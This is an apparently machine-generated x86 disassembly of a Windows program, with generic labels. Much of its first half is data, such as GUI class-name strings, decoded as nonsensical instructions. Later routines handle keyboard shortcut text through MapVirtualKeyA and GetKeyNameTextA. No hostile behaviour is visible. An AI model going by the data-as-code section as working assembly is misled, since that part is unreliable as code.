inc eax
sub_405d90
mov esp 0x100409b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xdc6d6574
movsd [ edi ] [ esi ]
inc ebx
add [ eax + eax ] dl
[ ebx + edx * 4 - 0x614fffc0 ]
sub_405f88
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x60
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc eax
add [ eax ] dl
add [ eax ] al
nop
pop esi
inc eax
add [ esp + ebp ] bh
inc esp
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
sub_405fc4
add al 0xc0
inc esp
add [ eax ] bl
rol [ eax + eax - 0x1c ] 0xab
inc eax
add [ eax ] dl
into
inc ebx
add [ eax ] dl
inc esp
add [ ecx * 8 - 0x4a73ffbd ] cl
inc eax
add [ esi + esi * 4 + 0x40 ] bh
add ah al
daa
inc esp
add [ eax ] dh
sub [ eax + eax - 0x7c ] eax
sub al 0x44
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp - 0x54dfffbc ] bl
inc eax
add [ eax - 0x4b ] bl
inc eax
add al ch
mov ebp 0xbcdc0040
inc eax
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x90756e65
nop
sbb al 0x60
inc eax
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xd0756e65
pop edi
inc eax
add [ edi + ebx * 2 + 0x40 ] al
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
add [ esp + edi * 4 ] ch
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax + 0x8004059 ] bh
mov esp 0xbc2c0040
push es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
add al 0x58
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] dh
add bh bh
pop esp
mov ah 0x40
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
jns r-xdata
outsb
jo r-xdata
inc ebx
push 0x65676e61
nop
or al [ eax ]
or [ edi + 0x6e ] cl
jb r-xdata
add [ eax + eax ] bh
add bh bh
sbb [ esi + 0x10040 ] dh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ esi ] al
inc eax
mov eax 0x50004059
mov esp 0xbc740040
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
insd
popad
inc edx
outsd
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0xd004061 ] ah
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
outsb
je r-xdata
ja r-xdata
dec ecx
insd
popad
jae r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] cl
[ eax + 0x10040bc ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
add [ ebp + eax * 8 + 0x40 ] bl
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
fsub [ ecx + 0x40 ]
add [ 0x654c616d ] cl
je r-xdata
add [ eax ] al
add [ eax ] al
add al 0x0
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x74754274
je r-xdata
insd
popad
je r-xdata
dec esp
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + 0x40 ] ah
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
popad
inc eax
push 0x3004061
andps xmm2 [ eax + 0x6f ]
jo r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ 0xffffffff9cff0000 ] dh
mov ebx 0x10040
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
dec ebp
jb r-xdata
add [ eax - 0x44 ] dl
inc eax
add [ esp + edi * 4 + 0x40 ] dh
jo r-xdata
nop
nop
insd
popad
dec esi
outsd
nop
nop
test al 0x62
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
add [ eax ] dl
into
inc ebx
add [ eax ] dl
inc esp
add [ ecx * 8 - 0x4a73ffbd ] cl
inc eax
add [ esi + esi * 4 + 0x40 ] bh
inc esp
add [ eax + eax * 8 ] al
inc esp
add [ eax ] bl
rol [ eax + eax + 0x5c ] 0xc5
inc eax
je r-xdata
outsd
insd
outsb
nop
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
bound eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
inc eax
add [ eax + 0x62a89090 ] dl
jae r-xdata
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
outsb
je r-xdata
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6465646f
inc eax
pop eax
movsd [ edi ] [ esi ]
inc ebx
add [ eax + eax ] ah
add bh bh
push 0x40bb
mov dl 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ ecx ] dl
add bh bh
push ecx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] cl
outsb
jne r-xdata
retn 0x44
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add esp ebx
popad
or eax 0x6f42616d
insd
popad
push esp
outsd
je r-xdata
jne r-xdata
je r-xdata
jb r-xdata
add [ eax ] eax
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
inc eax
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
imul eax [ ecx + ebp * 2 + 0x4d ] 0x465646f
pop eax
outsb
jne r-xdata
outsd
outsb
je r-xdata
pop ecx
add [ eax ] al
[ ecx ]
outsd
push eax
outsd
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
inc esp
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
cmp al 0x2c
cld
bound eax [ eax ]
pop es
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
bound eax [ eax ]
push 0x90000000
pop esi
inc eax
add [ esp + ebp ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
outsd
inc edx
inc ecx
je r-xdata
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
nop
movsb [ edi ] [ esi ]
popad
inc eax
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] dh
add bh bh
pop esp
mov ah 0x40
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
jo r-xdata
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
outsb
jne r-xdata
outsb
nop
nop
loopne r-xdata
je r-xdata
arpl [ ebx + 0x42 ] bp
jne r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
je r-xdata
push cs
push eax
popad
jb r-xdata
[ ebx + edi * 4 + 0x10040 ]
inc eax
add [ eax + eax ] bh
add bh bh
sbb [ esi + 0x10040 ] dh
add [ eax ] al
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x38 ] 0xc2
inc ebx
add [ esp + eax * 8 - 0x379fffbd ] ch
inc ebx
add [ edx + eax * 8 - 0x3c87ffbd ] bh
inc ebx
add [ esi + edi * 4 + 0x40 ] ch
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
ja r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc065646f
movsd [ edi ] [ esi ]
inc ebx
add ah al
lds eax [ eax ]
loopne r-xdata
movsd [ edi ] [ esi ]
inc ebx
add [ eax + eax ] ah
add bh bh
push 0x40bb
mov dl 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
shl [ ebp - 0x3a3bffbd ] 0x40
add al ah
lds eax [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov eax 0x50004059
mov esp 0xbc740040
inc eax
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
nop
inc esp
bound eax [ eax ]
push es
push cs
push esp
dec ebp
jne r-xdata
inc eax
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
jo r-xdata
or eax 0x6f54616d
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
insd
popad
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esp [ ebp + 0x40 ]
jo r-xdata
inc ebx
push 0x65676e61
hlt
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa065646f
popad
inc eax
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] cl
dec edi
ja r-xdata
bound eax [ eax ]
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax - 0x55 ] bl
outsb
add al 0x58
inc eax
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
outsd
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
movsd [ edi ] [ esi ]
inc esp
add [ 0xffffffff9cff0000 ] dh
mov ebx 0x10040
add ah al
daa
inc esp
add [ eax ] dh
sub [ eax + eax - 0x7c ] eax
sub al 0x44
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp - 0x3b3fffbc ] bl
inc eax
add [ eax - 0x4b ] bl
inc eax
add [ eax - 0x54 ] bl
inc eax
add [ ebp + esi * 4 - 0x3a63ffc0 ] ch
inc eax
add al dl
mov [ eax ] 0xa
push esp
push eax
outsd
jo r-xdata
int 0x43
add [ ebp + esi * 4 - 0x4983ffc0 ] cl
inc eax
bound eax [ eax ]
inc esp
pop edi
inc eax
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
push esp
outsb
dec ebp
outsd
mov al [ gs : 0x58004061 ]
add [ eax ] al
[ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
dec esp
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x65 ] ah
inc eax
add [ eax + eax ] dl
add [ eax ] al
pop eax
stosd [ edi ]
outsb
add [ eax ] cl
dec edi
jb r-xdata
mov al 0x22
inc eax
add [ ebx + 0x40 ] al
add [ ebx ] dl
inc eax
add ah ch
and al [ eax ]
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ eax ] cl
add [ eax ] al
add ah al
and [ eax ] eax
xchg esp eax
retn 0x44
imul esi [ ebx + 0x74 ] 0x4065b890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
inc eax
mov esp 0xbc2c0040
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
mov eax 0x8004059
add [ ecx + 0x40 ] ah
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cld
call sub_42ac20
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
push 0x0
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_43130c
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
insd
push ebx
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
arpl [ ebx - 0x70 ] bp
sub_406604
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_42ac20
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
push 0x0
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_43130c
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
sub_406654
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
push ebp
call sub_406648
pop ecx
push eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
jmp sub_44c7a8
sub_40667c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x6 ] 0x0
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov ax [ ebp - 0x6 ]
pop ecx
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
mov [ ebp - 0x6 ] ax
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add [ ebp - 0x6 ] 0x4000
add [ ebp - 0x6 ] 0x8000
sub_4066cc
push ebp
mov ebp esp
add esp 0xfffffef4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x2 ] ax
mov eax [ ebp - 0x8 ]
call sub_44cae0
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
push 0x100
lea eax [ ebp - 0x10c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call GetKeyNameTextA
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x10c ]
mov ecx 0x100
call sub_44cd10
sub_40672c
push ebp
mov ebp esp
add esp 0xfffffff0
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_406933
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebp - 0x2 ]
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0xc ]
mov dl [ ebp - 0x2 ]
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_44cb78
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0xc ]
xor edx edx
mov dl [ ebp - 0x2 ]
sub edx 0x41
add edx 0x41
call sub_44cc88
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0xc ]
mov dl [ ebp - 0x2 ]
add dl 0xd
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_44cb78
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ rw-data ]
call sub_44cb78
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0xc ]
xor edx edx
mov dl [ ebp - 0x2 ]
sub edx 0x60
add edx 0x30
call sub_44cc88
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0xc ]
xor edx edx
mov dl [ ebp - 0x2 ]
sub edx 0x30
add edx 0x30
call sub_44cc88
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_44cae0
mov eax [ ebp - 0x8 ]
call sub_44cae0
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ rw-data ]
call sub_44cb78
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al [ ebp - 0x2 ]
sub eax 0x6f
lea edx [ ebp - 0x10 ]
call sub_446418
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_44cdac
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebp - 0x2 ]
call sub_4066cc
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_44cd68
mov eax [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
mov dl [ ebp - 0x2 ]
add dl 0x4
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_44cb78
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_44cd68
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44cd68
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_44cd68
mov eax [ ebp - 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40693a
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_44cb04
retn
sub_40694c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44cd60
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_44cd60
cmp ebx eax
jl r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_44cd60
push eax
mov eax [ ebp - 0x8 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44cf24
pop edx
pop ecx
call sub_446364
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x8 ]
call sub_44cd60
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_44cfa8
sub_4069c0
push ebp
mov ebp esp
add esp 0xfffffff0
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cf14
xor eax eax
push ebp
push sub_406abe
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x6 ] 0x0
mov [ ebp - 0xa ] 0x0
push ebp
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40694c
pop ecx
test al al
je r-xdata
or [ ebp - 0xa ] 0x2000
jmp r-xdata
push ebp
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40694c
pop ecx
test al al
je r-xdata
or [ ebp - 0xa ] 0x4000
jmp r-xdata
push ebp
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40694c
pop ecx
test al al
je r-xdata
push ebp
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40694c
pop ecx
test al al
je r-xdata
or [ ebp - 0xa ] 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or [ ebp - 0xa ] 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406ac5
lea eax [ ebp - 0x10 ]
call sub_44cae0
lea eax [ ebp - 0x4 ]
call sub_44cae0
retn
mov [ ebp - 0x8 ] 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x256
jne r-xdata
mov ax [ ebp - 0x8 ]
or ax [ ebp - 0xa ]
mov [ ebp - 0x6 ] ax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov ax [ ebp - 0x8 ]
call sub_40672c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4462cc
test eax eax
jne r-xdata
sub_406adc
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
call sub_43cc18
mov [ ebp - 0x2 ] ax
movzx edx [ ebp - 0x2 ]
mov cl 0x1
mov eax [ rw-data ]
call sub_43cbec
mov ax [ ebp - 0x2 ]
pop ecx
pop ebp
retn
sub_406b08
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_409348
mov edx [ ebp - 0x10 ]
cmp eax [ edx ]
jg r-xdata
mov edx [ ebp - 0x10 ]
mov edx [ edx ]
mov eax [ ebp - 0x14 ]
call sub_409374
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x33 ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x10 ]
inc [ eax ]
sub_406b74
push ebp
mov ebp esp
add esp 0xffffffd8
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
call sub_409348
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x25 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x10 ]
call sub_409348
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x20 ]
jl r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x19 ] 0xff
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x20 ]
jge r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x24 ]
jge r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_409374
mov al [ eax + 0x33 ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x19 ]
ja r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_409374
mov al [ eax + 0x33 ]
mov [ ebp - 0x19 ] al
mov al [ ebp - 0x19 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_406b08
pop ecx
mov [ ebp - 0x25 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_406b08
pop ecx
mov [ ebp - 0x25 ] al
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x20 ]
jge r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x24 ]
jge r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_409374
mov al [ eax + 0x33 ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_409374
mov al [ eax + 0x33 ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x14 ]
jmp r-xdata
inc [ ebp - 0x18 ]
sub_406c94
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c200
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_406cb8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40491c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
mov edx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov eax [ eax + 0x24 ]
call sub_40ca90
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_406d04
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404940
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
mov al [ eax + 0x58 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
cmp al [ edx + 0x2c ]
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_406d48
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404964
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
mov al [ eax + 0x59 ]
